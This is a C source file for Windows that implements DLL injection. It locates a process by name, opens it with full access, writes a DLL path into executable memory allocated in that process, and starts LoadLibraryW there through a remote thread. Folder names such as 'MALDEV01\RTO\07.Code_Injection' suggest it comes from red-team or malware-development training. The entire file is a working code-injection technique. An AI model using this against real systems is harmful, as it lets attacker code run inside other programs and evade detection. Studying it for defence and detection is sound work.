#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

// Find PID by process name. Returns first occurrence.
int findMyProc(wchar_t* procname) {

	HANDLE hSnapshot; // Handle al snapshot de todos los procesos en el sistema.
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	printf("Searching for the process %ls to get its PID...\n", procname);

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

	// It is neccesary to initialize the size of the process entry.
	/* Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize,
	Process32First fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */
	pe.dwSize = sizeof(PROCESSENTRY32W);

	// Retrieve infrormation about first process encountered in a system snapshot
	hResult = Process32FirstW(hSnapshot, &pe);

	// Get information about the obtained process using its handle
	// and exit if unsuccessful
	while (Process32NextW(hSnapshot, &pe)) {
		if (lstrcmpW(pe.szExeFile, procname) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
	}

	// Close the open handle; we don't need it
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {

	typedef BOOL(__stdcall * pLoadLibrary)(LPCSTR lpLibFileName); //We will need to find the pointer to this kernel32 function runtime

	// Search for the address of LoadLibraryA in our process
	// LoadLibrary that extends to LoadLibraryW is not present (gives a NULL pointer as a return)
	pLoadLibrary LOADLIBRARY = (pLoadLibrary) GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW"); //Obtaining from kernel32.dll the address of LoadLibrary
	
	if (LOADLIBRARY == NULL) {
		printf("Exiting as the library could not be loaded.");
		return EXIT_FAILURE;
	}

	printf("Library could be loaded, address of the library: 0x%lp\n", LOADLIBRARY);

	wchar_t pid_string[MAX_PATH] = L"notepad.exe";
	MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, pid_string, MAX_PATH); // Comment this line if you don't want CLI parsing
	int pid = findMyProc(pid_string);

	// Getting a handle to the process once we obtain its PID
	HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	if (hTargetProcess == NULL) {
		printf("Could not obtain a handle to the process. Error code %ld. Exiting...", GetLastError());
	}

	printf("Got a handle to PID (%ld). Address of handle: 0x%p\n", pid, hTargetProcess); // With %p we get the memaddress of the handle

	// Using the handle to create a memory buffer and storing the path of the DLL
	wchar_t dll_path[MAX_PATH] = L"C:\\Users\\MALDEV01\\Desktop\\RTO\\07.Code_Injection\\03.Shellcode-jaco\\process_injection\\x64\\Release\\injected.dll";
	MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, dll_path, MAX_PATH);
	printf("Trying to store the following DLL path: %ls\n", dll_path);

	LPVOID lpVirtualAllocEx = VirtualAllocEx(hTargetProcess, NULL, sizeof(dll_path), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	if (lpVirtualAllocEx == NULL) {
		printf("Could not allocate memory. Error code %ld", GetLastError());
	}
	
	printf("Got a memory zone starting at 0x%p\n", lpVirtualAllocEx);

	SIZE_T lpNumberOfBytesWritten;
	BOOL bWriteProcessMemory = WriteProcessMemory(hTargetProcess, lpVirtualAllocEx, dll_path, sizeof(dll_path), &lpNumberOfBytesWritten);
	
	if (!bWriteProcessMemory) {
		printf("Could not write the DLL path in memory region. Error code: %ld", GetLastError());
	}

	printf("DLL path written into memory.\nCreating remote thread in the target process...\n");

	// Execute LoadLibrary in the remote process (we have its address) pointing to this memory zone where the DLL path is stored.
	LPDWORD lpThreadId = NULL;
	HANDLE hRemoteThread = CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LOADLIBRARY, lpVirtualAllocEx, 0, lpThreadId);

	if (hRemoteThread == NULL) {
		printf("Could not create remote thread in the target process. Error code %ld", GetLastError());
	}
	WaitForSingleObject(hRemoteThread, INFINITE);
	CloseHandle(hTargetProcess);
	CloseHandle(hRemoteThread);

	return EXIT_SUCCESS;
}